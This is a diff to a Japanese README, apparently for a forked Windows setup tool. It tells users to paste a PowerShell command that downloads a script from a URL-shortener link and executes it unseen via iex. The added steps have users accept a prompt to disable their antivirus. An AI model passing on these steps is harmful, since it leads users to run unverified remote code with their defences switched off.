@@ -9,7 +9,11 @@
 ```
 powershell -NoProfile -ExecutionPolicy unrestricted -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; &iex(New-Object Net.WebClient).DownloadString('https://x.gd/49Xub')"
 ```
-6. 一連の処理が終わると再起動します。
+6. 以下のメッセージが表示されたら何かキー（スペース等）を押します。
+
+   "Please DISABLE your ANTIVIRUS to prevent any issues and PRESS any KEY to Continue!"
+   
+7. 後は待つだけ。処理が終わると自動的に再起動します。
 
 
 以降はFork元から変更なしです
